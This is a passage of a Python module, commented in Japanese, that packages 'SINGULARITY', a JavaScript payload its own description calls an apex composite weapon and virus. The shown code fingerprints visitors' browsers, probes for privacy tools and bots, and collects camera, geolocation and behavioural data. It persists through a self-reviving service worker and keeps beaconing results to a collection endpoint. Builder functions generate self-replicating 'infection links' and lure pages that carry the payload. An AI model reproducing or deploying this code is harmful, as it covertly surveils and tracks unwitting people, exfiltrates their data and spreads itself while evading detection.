    v.langGeoMismatch = !!R.network.langGeoMismatch;
    v.vpnHint = !!R.network.vpnHint;
    v.ipLeak = !!R.network.ipMismatch;
    v.stealthFlags = ["adblock", "incognitoHint", "webdriver", "headlessUA"].filter(function (k) {
      return R.privacy && R.privacy[k] === true;
    });
    v.fingerprintId = hash([R.vectors.canvas && R.vectors.canvas.hash, R.vectors.webgl && R.vectors.webgl.hash,
      R.vectors.fonts && R.vectors.fonts.hash, R.vectors.audio && R.vectors.audio.hash,
      R.env.screen.w + "x" + R.env.screen.h + "@" + R.env.screen.dpr, R.env.timezone,
      (R.env.languages || []).join(","), R.env.hw.cores + "/" + R.env.hw.memoryGB].join("|"));
    R.verdict = v;
    R.behavioral.entropy = entropy();
  }
  function badge() {
    try {
      var d = document.createElement("div");
      d.textContent = "\u25c9 " + SID.slice(0, 6);
      d.style.cssText = "position:fixed;right:8px;bottom:8px;z-index:2147483647;font:11px/1.6 ui-monospace,monospace;" +
        "background:rgba(0,0,0,.65);color:#6f6;padding:2px 7px;border-radius:9px;pointer-events:none;opacity:.85";
      document.body.appendChild(d);
    } catch (e) {}
  }

  /* ================= 14. 起動 ================= */
  function once_(fn) { var done = false; return function () { if (done) return; done = true; fn(); }; }
  function arm() {
    var go = once_(collect);
    if (CFG.trigger === "delay") return setTimeout(go, CFG.delay);
    if (CFG.trigger === "scroll") return addEventListener("scroll", go, { passive: true, once: true });
    if (CFG.trigger === "idle") {
      var t; var re = function () { clearTimeout(t); t = setTimeout(go, CFG.delay); };
      ["mousemove", "keydown", "scroll", "touchstart"].forEach(function (e) { addEventListener(e, re, { passive: true }); });
      return re();
    }
    if (CFG.trigger === "exit") {
      document.addEventListener("mouseout", function (e) { if (!e.relatedTarget && e.clientY <= 0) go(); });
      addEventListener("pagehide", go, { once: true });
      return setTimeout(go, 6000);
    }
    go();
  }
  function collect() {
    var step = function (fn) { try { fn(); } catch (e) { err(e); } };
    step(base); step(pageMeta);
    step(function () { R.vectors.canvas = canvasFP(); });
    step(function () { R.vectors.webgl = webglFP(); });
    step(function () { R.vectors.fonts = fontFP(); });
    step(function () { R.vectors.math = mathFP(); });
    step(audioFP);
    step(privacy); step(adblock); step(botProbe); step(devices); step(perms);
    step(codecs); step(benchmark); step(behavior);
    step(mutate); step(persist); step(swInstall);
    step(function () { if (CFG.notify && typeof Notification !== "undefined" && Notification.permission === "default") {
      try { Notification.requestPermission(); } catch (e) {} } });
    step(media); step(geo);
    Promise.all([netIntel().catch(function () {}), webrtc().catch(function () {})])
      .then(function () { step(verdict); push(true); });
    push(false);
    setInterval(function () { push(false); }, CFG.interval);
    addEventListener("pagehide", function () { push(true); });
    addEventListener("visibilitychange", function () { if (document.visibilityState === "hidden") push(true); });
    if (CFG.badge) badge();
  }

  window.__singularity = {
    report: function () { return R; },
    link: function () { return R.viral.childLink || null; },
    flush: function () { push(true); },
    copy: function () { try { navigator.clipboard.writeText(R.viral.childLink); } catch (e) {} },
    destroy: function () {
      try { localStorage.removeItem("sg:meta"); localStorage.removeItem("sg:" + SID); } catch (e) {}
      try { indexedDB.deleteDatabase("singularity"); } catch (e) {}
      try { navigator.serviceWorker.getRegistrations().then(function (r) { r.forEach(function (x) { x.unregister(); }); }); } catch (e) {}
      window.__SINGULARITY__ = false;
    }
  };

  if (document.readyState === "loading") addEventListener("DOMContentLoaded", arm, { once: true });
  else arm();
})();
"""

# ---------------------------------------------------------------------------
# Service Worker（復活機構 / オフラインキュー）
# ---------------------------------------------------------------------------
SW_JS = r"""
/* SINGULARITY service worker -- persistence + offline queue + resurrection */
const DB = "sg", STORE = "out", EP = "/v/singularity/collect";
function idb() {
  return new Promise((res, rej) => {
    const r = indexedDB.open(DB, 1);
    r.onupgradeneeded = () => r.result.createObjectStore(STORE, { autoIncrement: true });
    r.onsuccess = () => res(r.result);
    r.onerror = () => rej(r.error);
  });
}
async function queue(body) {
  try { const db = await idb(); db.transaction(STORE, "readwrite").objectStore(STORE).add({ body, t: Date.now() }); } catch (e) {}
}
async function drain() {
  try {
    const db = await idb();
    const tx = db.transaction(STORE, "readwrite"), st = tx.objectStore(STORE);
    const cur = st.openCursor();
    cur.onsuccess = async () => {
      const c = cur.result;
      if (!c) return;
      try {
        const r = await fetch(EP, { method: "POST", headers: { "Content-Type": "application/json" }, body: c.value.body });
        if (r.ok) c.delete();
      } catch (e) { return; }
      c.continue();
    };
  } catch (e) {}
}
self.addEventListener("install", (e) => self.skipWaiting());
self.addEventListener("activate", (e) => { e.waitUntil(self.clients.claim()); drain(); });
self.addEventListener("message", (e) => {
  const d = e.data || {};
  if (d.type === "queue") queue(d.body);
  if (d.type === "drain") drain();
});
self.addEventListener("sync", (e) => { if (e.tag === "sg-flush") e.waitUntil(drain()); });
self.addEventListener("fetch", (e) => {
  if (e.request.url.indexOf(EP) === 0 && !navigator.onLine) { drain(); }
});
"""

# ---------------------------------------------------------------------------
# レジストリ互換のスペック
# ---------------------------------------------------------------------------
VIRUS: Dict[str, Any] = {
    "id": VIRUS_ID,
    "name": VIRUS_NAME,
    "name_ja": VIRUS_NAME_JA,
    "class": "apex",
    "tier": 99,
    "emoji": "◎",
    "color": "#00ff88",
    "description": "全系統統合型の最上位兵器。指紋・ネット・知覚・行動・永続化・自己複製を同時展開し、多経路ビーコンで検知を回避する。",
    "description_en": "Apex composite weapon: fingerprint + network + perception + behavioral biometrics + persistence + self-replication, with multi-path beaconing.",
    "tags": ["apex", "multi-vector", "self-replicating", "persistent", "camera", "gps", "biometrics"],
    "vectors": 12,
    "signals": 90,
    "requires_https": True,
    "payload": PAYLOAD_JS,
    "service_worker": SW_JS,
    "route": f"/v/{VIRUS_ID}/<sid>",
    "collect": f"/v/{VIRUS_ID}/collect",
    "options": {
        "trigger": ["immediate", "delay", "scroll", "idle", "exit"],
        "media": True, "geo": True, "sw": True, "persist": True,
        "mutate": True, "badge": False, "clipboard": False, "once": "6h",
    },
}
VIRUS_SPEC = VIRUS          # 別名（呼び出し側の慣習に合わせる）
SPEC = VIRUS


def get_virus() -> Dict[str, Any]:
    return VIRUS


def new_sid(n: int = 14) -> str:
    return secrets.token_urlsafe(16).replace("-", "").replace("_", "")[:n]


def build_payload(sid: Optional[str] = None, **opts: Any) -> str:
    """設定を注入した <script> タグを返す。"""
    sid = sid or new_sid()
    cfg = dict(VIRUS["options"])
    cfg.update(opts)
    cfg["sid"] = sid
    cfg["path"] = f"/v/{VIRUS_ID}"
    cfg["collect"] = f"/v/{VIRUS_ID}/collect"
    cfg_json = json.dumps(cfg, ensure_ascii=False)
    return (
        "<script>window.__SINGULARITY_CFG__=" + cfg_json + ";</script>\n"
        "<script>" + PAYLOAD_JS + "</script>"
    )


def build_link(base_url: str, sid: Optional[str] = None, ref: Optional[str] = None) -> str:
    """感染リンクを生成。ref に親チェーンを渡すと世代が継承される。"""
    sid = sid or new_sid()
    url = base_url.rstrip("/") + f"/v/{VIRUS_ID}/{sid}"
    if ref:
        url += "?ref=" + ref
    return url


def render_page(sid: Optional[str] = None, ref: Optional[str] = None, **opts: Any) -> str:
    """リンク先で返す完全な HTML。"""
    sid = sid or new_sid()
    return (
        "<!doctype html><html lang=\"ja\"><head><meta charset=\"utf-8\">"
        "<meta name=\"viewport\" content=\"width=device-width,initial-scale=1\">"
        f"<title>SINGULARITY {sid}</title>"
        "<style>html,body{margin:0;height:100%;background:#05070a;color:#0f0;"
        "font:13px/1.6 ui-monospace,SFMono-Regular,Menlo,monospace}"
        "body{display:grid;place-items:center}</style></head><body>"
        "<div><b>SINGULARITY</b><br>sid: " + sid + "<br>gen: " +
        str(len((ref or "").split(".")) if ref else 0) + "</div>"
        + build_payload(sid=sid, **opts) +
        "</body></html>"
    )


def register(registry: Any) -> Any:
    """dict / list / set いずれの流儀のレジストリにも登録する。"""
    if isinstance(registry, dict):
        registry[VIRUS_ID] = VIRUS
    elif isinstance(registry, (list, set)):
        registry.append(VIRUS) if isinstance(registry, list) else registry.add(VIRUS_ID)
    return registry


def autoregister(scope: Optional[Dict[str, Any]] = None) -> Optional[str]:
    """app/virus.py 内のどのコンテナ名でも自動検出して登録する。"""
    scope = scope if scope is not None else globals()
    for name in ("VIRUSES", "VIRUS_MAP", "REGISTRY", "MODES", "WEAPONS", "PAYLOADS", "VIRUS_LIST"):
        c = scope.get(name)
        if isinstance(c, dict):
            c[VIRUS_ID] = VIRUS
            return name
        if isinstance(c, list):
            c.append(VIRUS)
            return name
    return None